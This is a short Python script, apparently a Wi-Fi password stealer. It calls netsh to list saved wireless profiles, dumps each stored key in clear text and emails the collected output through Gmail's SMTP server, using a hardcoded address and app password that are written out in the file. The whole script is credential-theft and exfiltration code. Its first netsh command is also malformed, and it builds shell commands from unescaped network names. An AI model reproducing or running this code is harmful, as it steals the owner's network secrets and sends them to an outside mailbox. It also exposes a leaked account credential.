#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # Google's server runs on port 587
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh eth0 show profile"
networks = str(subprocess.check_output(command, shell = True))
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = str(subprocess.check_output(command, shell=True))
    result = result + current_result
# You need the app password Google gives you, you can't use your account's password
send_mail("acaroglugoktan@gmail.com", "jtan qyoi bbqs ylyu", result)